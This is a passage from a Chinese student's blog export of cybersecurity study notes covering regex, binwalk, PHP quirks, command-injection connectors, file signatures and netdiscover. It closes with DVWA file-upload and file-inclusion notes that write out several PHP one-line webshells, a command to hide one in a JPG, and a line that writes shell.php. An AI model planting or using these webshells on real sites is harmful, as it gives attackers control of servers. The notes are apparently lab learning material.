<p>\W    匹配除数字、字母、下划线以外的任意字符</p>
<p>.     匹配除换行符以外的任意一个字符</p>
<p>*     匹配0次，或1次、或多次其前面字符</p>
<p>+     匹配1次或多次其前面的字符</p>
<p>？    匹配0次或1次前面的字符</p>
<p>{n}   表示其前面字符恰好出现n次</p>
<p>{n,}  表示其前面字符出现不少于n次</p>
<p>{n,m} 表示其前面的字符至少出现n次，最多出现m次</p>
<p>^或\A 匹配字符串开始的位置</p>
<p>$或者\Z  匹配字符串的结束位置</p>
<p>|   匹配两个或多个模式</p>
<p>[]   匹配方括号中的任意一个字符</p>
<p>[^]  匹配除方括号中字符以外的任意一个字符</p>
<p>()  将括号中作为一个整体以便将其中的内容获取到</p>
<h3 id="4-1-1php正则表达式-w-w-w-的区别？"><a href="#4-1-1php正则表达式-w-w-w-的区别？" class="headerlink" title="4.1.1php正则表达式[\w]+,\w+,[\w+]的区别？"></a>4.1.1php正则表达式[\w]+,\w+,[\w+]的区别？</h3><p>[\w]+和\w+没有区别，都是匹配数字和字母下划线的多个字符；</p>
<p>[\w+]表示匹配数字、字母、下划线和加号本身字符；</p>
<h3 id="4-1-2例"><a href="#4-1-2例" class="headerlink" title="4.1.2例"></a>4.1.2例</h3><p>[]：表示数组而非排列，即不按固定次序位置排列；在[]内的字符可以任意次序出现。</p>
<p>[ABC]+：可以匹配”AAABBBCCC,BBBAAACCC,BACCBACAACBAC,…”，不是一定按固定A….B….C…的次序排列。</p>
<p>[\w./-+]+：是匹配\w [0-9a-zA-Z_] 或 . 或 / 或 - 或 + 字符；</p>
<p>在[./-+]内均表示字符本身；</p>
<p>在[]+外表示{1,}至少1次或多次；</p>
<p>在[.]内点，不是任意字符的意思，就是匹配点.字符本身，点.可以不需要加反斜杠.。</p>
<p>在[]内特殊字符，表示匹配特殊字符本身，不需要加反斜杠，</p>
<p>在[]外特殊字符，表示匹配特殊字符本身，必须要加反斜杠。</p>
<p>\W 元字符用于查找非单词字符。</p>
<p>单词字符包括：a-z、A-Z、0-9，以及下划线。</p>
<p>故[^\W]可以匹配所有单词字符    </p>
<p>^：非的意思</p>
<p>/^$/：正则匹配的开头结尾</p>
<h3 id="4-1-3正则表达式“-d-d-d-”是什么意思？"><a href="#4-1-3正则表达式“-d-d-d-”是什么意思？" class="headerlink" title="4.1.3正则表达式“\d+||(\d+\.\d+”是什么意思？"></a>4.1.3正则表达式“\d+||(\d+\.\d+”是什么意思？</h3><p>\d  是匹配一个数字(0到9)</p>
<p>\d 前面多了第一个\ 是为了在程序中转义第二个\，这个你可以忽略</p>
<p>+表示 1个或多个组合起来</p>
<p>\d+ 就表示多个数字，形如 12、44、6763……</p>
<p>. 匹配一个小数点</p>
<p>\d+.\d+ 就表示小数，形如12.334、0.12、87.343……</p>
<p>| 表示或者，一个竖线就够了</p>
<p>() 括号在这里表示分组，实际不匹配任何字符，此处不要括号也可以</p>
<p>\d+||(\d+.\d+)  多个连续的数字或者 多个连续的数+小数点+多个连续的数<br>翻译下就是 非负整数或者非负小数</p>
<h2 id="4-23-binwalk使用"><a href="#4-23-binwalk使用" class="headerlink" title="4.23.binwalk使用"></a>4.23.binwalk使用</h2><p>binwalk  +文件路径  //分析文件中隐藏的其他文件。<br>dd if=图片名 of=ZIP压缩包的名称（自己命名） skip=偏移量 bs=1</p>
<h2 id="5-1php定界符"><a href="#5-1php定界符" class="headerlink" title="5.1php定界符"></a>5.1php定界符</h2><p>​       短标签<?  ?>  &lt;%  %&gt;</p>
<p>​       var_dump()查看变量类型</p>
<p>​       定界符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">          $a=&lt;&lt;&lt;EOT</span><br><span class="line">          XXXXXXX</span><br><span class="line">          EOT;</span><br><span class="line">          echo $a;</span><br><span class="line">          ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-2正则表达式-二）"><a href="#5-2正则表达式-二）" class="headerlink" title="5.2正则表达式(二）"></a>5.2正则表达式(二）</h2><p>模式分隔符后的”i”标记这是一个大小写不敏感的搜索</p>
<p>模式中的 \b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配</p>
<p>PHP提供4个专门的执行外部命令的函数：exec(), system(), passthru(), shell_exec()</p>
<p>除了拼接函数外，我们还可以使用命令连接符来组合这些系统函数增加命令执行成功率。常见的命令连接符有（“|，&amp;&amp;，||”这三个连接符都是Windows系统与Linux系统共有的，而“&amp;”是Windows系统特有，“；”是Linux系统特有的）：</p>
<p>|：管道操作符</p>
<p>A|B:无论执行的A命令是否正确，B命令都执行</p>
<p>&amp;&amp;：逻辑与</p>
<p>A&amp;&amp;B：只有在A命令成功执行的前提下，B命令才可以执行</p>
<p>||：逻辑或</p>
<p>A||B：只有在A命令没有执行失败的前提下，B命令才可以执行</p>
<p>&amp;</p>
<p>A&amp;B:不管A是否执行成功，B命令都会执行</p>
<p>A&amp;B:不管A是否执行成功，B命令都会执行</p>
<h2 id="5-3字符串经过md5加密"><a href="#5-3字符串经过md5加密" class="headerlink" title="5.3字符串经过md5加密"></a>5.3字符串经过md5加密</h2><p>  这里是0e开头的，在进行等于比较的时候，PHP 把它当作科学计数法，0 的无论多少次方都是零。</p>
<h2 id="5-4各类文件的16进制开头结尾"><a href="#5-4各类文件的16进制开头结尾" class="headerlink" title="5.4各类文件的16进制开头结尾"></a>5.4各类文件的16进制开头结尾</h2><p>jpg      文件头:  FF D8             文件尾： FF D9<br>JPEG     文件头：FF D8 FF           文件尾：FF D9<br>PNG    文件头：89 50 4E 47    文件尾：AE 42 60 82<br>GIF（gif ）<br>文件头：47 49 46 38    文件尾：00 3B<br>ZIP Archive（zip）<br>文件头：50 4B 03 04    文件尾：50 4B<br>TIFF（tif）<br>文件头：49 49 2A 00    文件尾：未知<br>Windows Bitmap（bmp）<br>文件头：42 4D    文件尾：未知<br>CAD（dwg）<br>文件头：41 43 31 30    文件尾：未知<br>XML（xml）<br>文件头：3C 3F 78 6D 6C    文件尾：未知<br>HTML（html）<br>文件头：68 74 6D 6C 3E<br>gif图像开始标志：47 49 46 38 39 61 结束标志：01 01 00 3B</p>
<h2 id="5-5局域网主机发现"><a href="#5-5局域网主机发现" class="headerlink" title="5.5局域网主机发现"></a>5.5局域网主机发现</h2><p>使用netdiscover 探测局域网内的主机，目的是发现需要渗透的主机</p>
<p>指定IP段</p>
<p>例如：10.10.10.0</p>
<p>netdiscover  -r 10.10.10.0/24</p>
<p>选择监听的网卡：比如eth0</p>
<p>netdiscover  -i eth0</p>
<p>主动发现：-i指定所要侦听的网卡，-r指定ip段。</p>
<p>netdiscover -i eth0 -r 10.10.10.0/24</p>
<h2 id="6-1vim-交换文件名"><a href="#6-1vim-交换文件名" class="headerlink" title="6.1vim 交换文件名"></a>6.1vim 交换文件名</h2><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：   </p>
<p>第一次产生的交换文件名为 .index.php.swp</p>
<p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p>
<p>第三次产生的交换文件则为 .index.php.swn</p>
<h1 id="二、学习总结"><a href="#二、学习总结" class="headerlink" title="二、学习总结"></a>二、学习总结</h1><p>这些是近十天的学习总结，学的不算很多，但很杂乱，近期恶补了一些php代码并且参加了一些ctf比赛，虽然往往一场ctf比赛只能写出一道甚至一道都写不出，但总的来说，应该算是有了一定的基础。</p>
<p>算算时间，学习网安也有大半年了，但有效时间也只有不到两个月，在这有效学习时间内，我学习了以下内容。</p>
<p>1.burpsuite抓包爆破</p>
<p>2.top10漏洞（除CSRF）</p>
<p>3.工具的利用</p>
<p>4.近期看着博客步骤对breach1.0进行一次完整的渗透</p>
<p>5.PHP语言</p>
<p>6.MySQL数据库</p>
<p>7.认识HTML，css，js</p>
<p>8.linux基础</p>
<p>9.SQL基础</p>
<p>10.web渗透之信息收集</p>
<h1 id="三、感悟"><a href="#三、感悟" class="headerlink" title="三、感悟"></a>三、感悟</h1><p>今天是2022年10月30日，距离第一次接触网安已有一年有余，那时意气风发，抱有对黑客技术的热爱与热情加入了信息安全实验室，但在实验室，我迷茫了，对所学知识的模糊认识产生了自我否定——我是不是不适合网安，我是不是比较笨拙？带着疑惑我不知所措，导致在寒假期间彻底摆烂，也因此主动退出实验室。</p>
<p>至2022年4月13日，胡老师想找几个对网安有兴趣的学生学习网安知识，我心中的火又燃了起来，我知道这是一个机会，证明我可以学好网安的唯一机会，我又开始学习网安。这次学的不再是逆向工程，而是web安全！</p>
<p>由于当时已到学期中旬，专业课繁多，学习时间较少，也快到期末，所以网安学习计划又搁置了，到了暑假事务繁多，有效学习时间也只有不到半个月，对此我深深惭愧。</p>
<p>寒暑假逆袭的关键，而我却没有加以利用，认真去学习！</p>
<p>接着开学封校，一直到九月中旬才能来校学习，这次，我不会再浪费时间，我一直以来的黑客梦永远不会消散。</p>
<p>虽然道路艰难，但我会一直前行，漫漫长征路，偏向虎山行，此志共勉！</p>
]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
  <entry>
    <title>网安基础总结四</title>
    <url>/2022/06/26/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%9B%9B/</url>
    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。</p>
<p>2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。</p>
<p>3.MIME类型：一种文件拓展名包含一种MIME类型。</p>
<span id="more"></span>

<h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><p>第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p>
<p>以下三条一句话木马</p>
<p>1.<?php @eval($_POST['flag']);?>此类为POST类型一句话木马，需蚁剑连接。</p>
<p>2.<?php eval($_REQUEST['php']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效）</p>
<p>3.<?php system($_REQUEST['linux']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效）</p>
<p>目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high”</p>
<h6 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h6><p>将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。</p>
<h6 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h6><p>此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。</p>
<p>用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件</p>
<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><h6 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h6><p>本地文件包含 Local File Include (LFI)</p>
<p>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。</p>
<p>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p>
<h6 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h6><p>远程文件包含 Remote File Include (RFI)</p>
<p>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。</p>
<p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
<p>文件包含漏洞也可以和文件上传漏洞相配合使用。</p>
<p>通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。</p>
<p> 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入   copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。</p>
<?php fputs(fopen('shell.php','w'),'<?php eval($_post[flag]);>');?><p>这段代码意思是生成shell.php这个新文件，并将<?php eval($_post[flag]);>');?>写入。</p>
<p>最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。</p>
<p>这就叫条件竞争绕过  竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。</p>
]]></content>
      <categories>
        <category>网安基础篇</category>
      </categories>
      <tags>
        <tag>web基础</tag>
      </tags>
  </entry>
</search>
